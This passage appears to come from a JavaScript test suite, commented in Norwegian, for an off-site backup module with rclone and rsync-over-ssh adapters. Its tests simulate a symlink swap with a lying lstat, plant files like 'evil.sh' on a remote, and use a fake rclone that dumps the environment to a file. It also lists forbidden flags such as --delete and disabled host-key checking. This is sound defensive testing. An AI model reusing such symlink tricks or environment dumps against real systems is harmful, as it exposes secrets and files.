    const target = tempDir("wpc2-usb-");
    writeFileSync(join(target, LOCAL_MARKER), "");
    const set = makeSet(out, WHEN);
    const prepared = await prep(set.dir);
    const plain = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs: 20_000 }, { sourceDir: out });
    await plain.push(prepared);
    const outside = join(tempDir(), "hemmelig.txt");
    writeFileSync(outside, "KLARTEKST-HEMMELIGHET");
    rmSync(join(target, set.name, "infisical.dump.age"));
    symlinkSync(outside, join(target, set.name, "infisical.dump.age"));
    // oppslaget (lstat) lyver: «alt er vanlige filer» - slik en fil som byttes ut ETTER oppslaget ville sett ut
    const { lstat } = await import("node:fs/promises");
    const lying = async (path) => { const st = await lstat(path); return { isFile: () => true, isDirectory: () => st.isDirectory(), isSymbolicLink: () => false, size: st.size, mtimeMs: st.mtimeMs }; };
    const sink = createOffsiteSink({ adapter: "local", dir: target, allowSameDevice: true, timeoutMs: 20_000 }, { sourceDir: out, fs: { lstat: lying } });
    const dest = join(tempDir(), "hentet");
    await expect(sink.fetch(set.name, dest)).rejects.toMatchObject({ code: "offsite_ineligible" });
    for (const n of existsSync(dest) ? readdirSync(dest) : []) expect(readFileSync(join(dest, n), "utf8")).not.toContain("KLARTEKST-HEMMELIGHET");
  });
});

/** En prosesskjører som registrerer kallene (og leser listefilen mens den fortsatt finnes). */
function recorder(responses = []) {
  const calls = [];
  const run = async (file, args, opts) => {
    const call = { file, args: [...args], opts, listContents: null };
    const flag = args.find((a) => a.startsWith("--files-from=")) ?? null;
    const listPath = flag !== null ? flag.slice("--files-from=".length) : args[args.indexOf("--files-from-raw") + 1];
    if (listPath && existsSync(listPath)) call.listContents = readFileSync(listPath, "utf8");
    calls.push(call);
    return { code: 0, stdout: "", stderr: "", timedOut: false, truncated: false, spawnError: null, ...(responses.shift() ?? {}) };
  };
  return { run, calls };
}

const lsjsonFor = (prepared, { hashes = true, drop = null, sizeDelta = {}, badHash = null } = {}) =>
  JSON.stringify(prepared.files.filter((f) => f.name !== drop).map((f) => ({
    Path: f.name, Name: f.name, Size: f.size + (sizeDelta[f.name] ?? 0), IsDir: false, Hashes: hashes ? { md5: "m", sha1: "s", sha256: f.name === badHash ? "0".repeat(64) : f.sha256 } : { md5: "m" }
  })));

describe("WP-C2 off-site: rclone-adapteren (eierens ferdig-konfigurerte remote) - argv, verifisering, feilhåndtering", () => {
  const config = { adapter: "rclone", remote: "mitt-b2:jarvis/backups", timeoutMs: 600_000 };
  const makePrepared = async () => prep(makeSet(tempDir(), WHEN).dir);

  it("push = `rclone copy` (aldri sync/delete) av NØYAKTIG filene i listen, etterfulgt av lsjson-verifisering; ingen shell", async () => {
    const prepared = await makePrepared();
    const rec = recorder([{}, { stdout: lsjsonFor(prepared) }]);
    const sink = createOffsiteSink(config, { run: rec.run, sourceDir: "/x" });
    const res = await sink.push(prepared);
    expect(res).toEqual({ verification: "sha256", files: 5, bytes: prepared.bytes });
    const [copy, ls] = rec.calls;
    expect(copy.file).toBe("rclone");
    expect(copy.args[0]).toBe("copy");
    expect(copy.args).toContain("--files-from-raw");
    expect(copy.args).toContain("--checksum");
    expect(copy.args.join(" ")).not.toMatch(/\bsync\b|--delete|--immutable|--config|--password|-v\b/);
    expect(copy.args.at(-2)).toBe(prepared.dir);
    expect(copy.args.at(-1)).toBe(`mitt-b2:jarvis/backups/${prepared.name}`);
    expect(copy.listContents.trim().split("\n").sort()).toEqual(prepared.files.map((f) => f.name).sort());
    expect(copy.listContents).not.toMatch(/manifest\.json\n|SHA256SUMS/); // kun .age-filer
    expect(copy.opts.timeoutMs).toBe(600_000);
    expect(ls.args).toEqual(["lsjson", "--hash", "--no-modtime", "--no-mimetype", `mitt-b2:jarvis/backups/${prepared.name}`]);
  });

  it("rclone-remote uten sti (`b2:`) gir `b2:<sett>` uten dobbel skråstrek", () => {
    expect(rcloneCopyArgs({ remote: "b2:", setName: "jarvis-backup-20261009T020000Z", srcDir: "/s", listFile: "/l" }).at(-1)).toBe("b2:jarvis-backup-20261009T020000Z");
  });

  it("verifisering: sha256 når leverandøren oppgir den, ærlig `size_only` når ikke, og feil ved mangler/størrelse/avvikende hash", async () => {
    const prepared = await makePrepared();
    expect(compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared)))).toMatchObject({ verification: "sha256" });
    expect(compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared, { hashes: false })))).toMatchObject({ verification: "size_only" });
    expect(() => compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared, { drop: "jarvis.dump.age" })))).toThrow(/mangler: jarvis\.dump\.age/);
    expect(() => compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared, { sizeDelta: { "globals.sql.age": 1 } })))).toThrow(/størrelsen avviker: globals\.sql\.age/);
    expect(() => compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared, { badHash: "langfuse.dump.age" })))).toThrow(/sjekksummen avviker: langfuse\.dump\.age/);
    try {
      compareRemoteListing(prepared, parseLsjson(lsjsonFor(prepared, { drop: "jarvis.dump.age" })));
    } catch (err) {
      expect(err.code).toBe("offsite_verify_failed");
    }
  });

  it("list: kun settkataloger (ekstra objekter ignoreres); «directory not found» (exit 3) = ingenting sendt ennå", async () => {
    const ls = JSON.stringify([
      { Name: "jarvis-backup-20261009T020000Z", IsDir: true }, { Name: "jarvis-backup-20261008T020000Z", IsDir: true }, { Name: "annet", IsDir: true }, { Name: "jarvis-backup-20261007T020000Z", IsDir: false }
    ]);
    const sink = createOffsiteSink(config, { run: recorder([{ stdout: ls }]).run });
    expect(await sink.list()).toEqual(["jarvis-backup-20261008T020000Z", "jarvis-backup-20261009T020000Z"]);
    expect(await createOffsiteSink(config, { run: recorder([{ code: 3, stderr: "directory not found" }]).run }).list()).toEqual([]);
  });

  it("fetch henter kun *.age og rydder bort alt annet fra målet (en angriper med skrivetilgang til fjernmålet kan ha lagt noe ved)", async () => {
    const dest = join(tempDir(), "hentet");
    const rec = recorder([{}]);
    const run = async (...a) => { const r = await rec.run(...a); mkdirSync(dest, { recursive: true }); writeFileSync(join(dest, "jarvis.dump.age"), "x"); writeFileSync(join(dest, "evil.sh"), "x"); return r; };
    const names = await createOffsiteSink(config, { run }).fetch("jarvis-backup-20261009T020000Z", dest);
    expect(names).toEqual(["jarvis.dump.age"]);
    expect(readdirSync(dest)).toEqual(["jarvis.dump.age"]);
    expect(rec.calls[0].args).toEqual(expect.arrayContaining(["copy", "--include", "*.age"]));
  });

  it("feilkoder: manglende verktøy, tidsavbrudd og ikke-null exit gir presise `offsite_*`-koder med REDIGERT tekst", async () => {
    const prepared = await makePrepared();
    const redact = (s) => String(s).replace(/hemmelig-token-\d+/g, "<redacted>");
    const mk = (res) => createOffsiteSink(config, { run: recorder([res]).run, redact });
    await expect(mk({ code: null, spawnError: "ENOENT" }).push(prepared)).rejects.toThrow(/kunne ikke starte \(ENOENT\).*installert og i PATH/);
    await expect(mk({ code: null, timedOut: true }).push(prepared)).rejects.toMatchObject({ code: "offsite_timeout" });
    const err = await mk({ code: 1, stderr: "Failed to copy: auth hemmelig-token-123 rejected\n" }).push(prepared).catch((e) => e);
    expect(err).toMatchObject({ code: "offsite_failed" });
    expect(err.message).not.toContain("hemmelig-token-123");
    expect(err.message).toContain("exit 1");
  });
});

describe("WP-C2 off-site: rsync over ssh - kun nøkkelbasert, streng vertsnøkkel, argv uten shell", () => {
  const config = { adapter: "rsync_ssh", target: { user: "backup", host: "annen-vert.lan", path: "/srv/jarvis", spec: "backup@annen-vert.lan:/srv/jarvis" }, keyFile: "/home/jarvis/.ssh/id_backup", knownHosts: "/home/jarvis/.ssh/known_hosts_backup", timeoutMs: 300_000 };
  const makePrepared = async () => prep(makeSet(tempDir(), WHEN).dir);

  it("ssh-kommandoen krever BatchMode=yes + StrictHostKeyChecking=yes, ingen passord/agent/videresending, og bruker KUN den oppgitte nøkkelen", () => {
    const ssh = sshCommand({ keyFile: "/k/id", knownHosts: "/k/kh" });
    for (const required of ["BatchMode=yes", "StrictHostKeyChecking=yes", "PasswordAuthentication=no", "KbdInteractiveAuthentication=no", "ClearAllForwardings=yes", "ForwardAgent=no", "IdentitiesOnly=yes", "-i /k/id", "UserKnownHostsFile=/k/kh", "ConnectTimeout=20"]) {
      expect(ssh, required).toContain(required);
    }
    expect(ssh).not.toMatch(/StrictHostKeyChecking=(no|accept-new)|UserKnownHostsFile=\/dev\/null|-A\b/);
    expect(sshCommand()).not.toContain("-i ");
  });

  it("push: rsync -a med --files-from, `--` før posisjonsargumentene, kun lister over filene, ingen --delete; deretter verifisering med --checksum --dry-run", async () => {
    const prepared = await makePrepared();
    const rec = recorder([{}, { stdout: "" }]);
    const sink = createOffsiteSink(config, { run: rec.run });
    const res = await sink.push(prepared);
    expect(res).toMatchObject({ verification: "checksum_dry_run", files: 5 });
    const [push, verify] = rec.calls;
    expect(push.file).toBe("rsync");
    expect(push.args.slice(-3)).toEqual(["--", `${prepared.dir}/`, `backup@annen-vert.lan:/srv/jarvis/${prepared.name}/`]);
    expect(push.args).toEqual(expect.arrayContaining(["-a", "--partial-dir=.rsync-partial", "--chmod=D700,F600", "-e", sshCommand(config)]));
    expect(push.args.join(" ")).not.toMatch(/--delete|--remove-source-files|--ignore-times|--rsh=|--rsync-path/);
    expect(push.listContents.trim().split("\n").sort()).toEqual(prepared.files.map((f) => f.name).sort());
    expect(verify.args).toEqual(expect.arrayContaining(["--checksum", "--dry-run", "--itemize-changes"]));
  });

  it("verify: tomt itemize-svar = identisk; `>f…`/`<f…`/`cf…` = avvik; rene attributtlinjer (.f…/.d…) teller ikke", async () => {
    const prepared = await makePrepared();
    expect(rsyncDifferences("")).toEqual([]);
    expect(rsyncDifferences(".d..t...... ./\n.f..t...... a.age\n")).toEqual([]);
    expect(rsyncDifferences(">fc.t...... jarvis.dump.age\n<f+++++++++ globals.sql.age\ncf+++++++++ x.age\n")).toEqual(["jarvis.dump.age", "globals.sql.age", "x.age"]);
    const sink = createOffsiteSink(config, { run: recorder([{ stdout: ">fcst...... jarvis.dump.age\n" }]).run });
    await expect(sink.verify(prepared)).rejects.toMatchObject({ code: "offsite_verify_failed" });
    await expect(createOffsiteSink(config, { run: recorder([{ code: 255, stderr: "Host key verification failed." }]).run }).verify(prepared)).rejects.toThrow(/exit 255.*Host key verification failed/);
  });

  it("list parser `rsync --list-only` (kun settkataloger); fetch tar kun *.age og rydder resten", async () => {
    const out = [
      "drwx------          4,096 2026/10/09 02:17:45 .", "drwx------          4,096 2026/10/09 02:17:45 jarvis-backup-20261009T020000Z", "drwx------          4,096 2026/10/08 02:17:45 jarvis-backup-20261008T020000Z",
      "-rw-------          1,024 2026/10/08 02:17:45 notes.txt"
    ].join("\n");
    expect(await createOffsiteSink(config, { run: recorder([{ stdout: out }]).run }).list()).toEqual(["jarvis-backup-20261008T020000Z", "jarvis-backup-20261009T020000Z"]);
    const dest = join(tempDir(), "hentet");
    const rec = recorder([{}]);
    const run = async (...a) => { const r = await rec.run(...a); mkdirSync(dest, { recursive: true }); writeFileSync(join(dest, "a.age"), "x"); writeFileSync(join(dest, "bad"), "x"); return r; };
    expect(await createOffsiteSink(config, { run }).fetch("jarvis-backup-20261009T020000Z", dest)).toEqual(["a.age"]);
    expect(rec.calls[0].args).toEqual(expect.arrayContaining(["--include=*.age", "--exclude=*"]));
    expect(rsyncPushArgs({ ssh: "ssh", srcDir: "/s", destSpec: "u@h:/p", setName: "n", listFile: "/l" })[0]).toBe("-a");
    expect(rsyncVerifyArgs({ ssh: "ssh", srcDir: "/s", destSpec: "u@h:/p", setName: "n", listFile: "/l" })).toContain("--dry-run");
  });
});

describe("WP-C2 off-site: standard-kjøreren gir underprosessene et MINIMALT miljø (aldri DB-passordet) og bruker argv uten shell", () => {
  it("en falsk `rclone` på PATH ser ikke JARVIS_DB_ADMIN_PASSWORD, men får PATH/HOME og RCLONE_*", async () => {
    const dump = join(tempDir(), "env.txt");
    const bin = fakeBinDir({ rclone: `env > ${dump}\nprintf '[]'` });
    const saved = { ...process.env };
    process.env.PATH = `${bin}:${saved.PATH}`;
    process.env.JARVIS_DB_ADMIN_PASSWORD = "SUPER-hemmelig-passord-123";
    process.env.RCLONE_CONFIG_PASS = "rclone-pass";
    try {
      const sink = createOffsiteSink({ adapter: "rclone", remote: "b2:x", timeoutMs: 10_000 }, {});
      expect(await sink.list()).toEqual([]);
      const seen = readFileSync(dump, "utf8");
      expect(seen).not.toContain("SUPER-hemmelig-passord-123");
      expect(seen).not.toContain("JARVIS_DB_ADMIN_PASSWORD");
      expect(seen).toContain("RCLONE_CONFIG_PASS=rclone-pass");
      expect(seen).toMatch(/^PATH=/m);
    } finally {
      for (const k of ["PATH", "JARVIS_DB_ADMIN_PASSWORD", "RCLONE_CONFIG_PASS"]) { if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k]; }
      chmodSync(bin, 0o755);
    }
  });

  it("manglende rclone gir en forståelig feil (ikke et kast fra spawn)", async () => {
    const saved = process.env.PATH;
    process.env.PATH = tempDir();
    try {
      const sink = createOffsiteSink({ adapter: "rclone", remote: "b2:x", timeoutMs: 10_000 }, {});
      await expect(sink.list()).rejects.toThrow(/kunne ikke starte \(ENOENT\)/);
    } finally {
      process.env.PATH = saved;
    }
  });
});
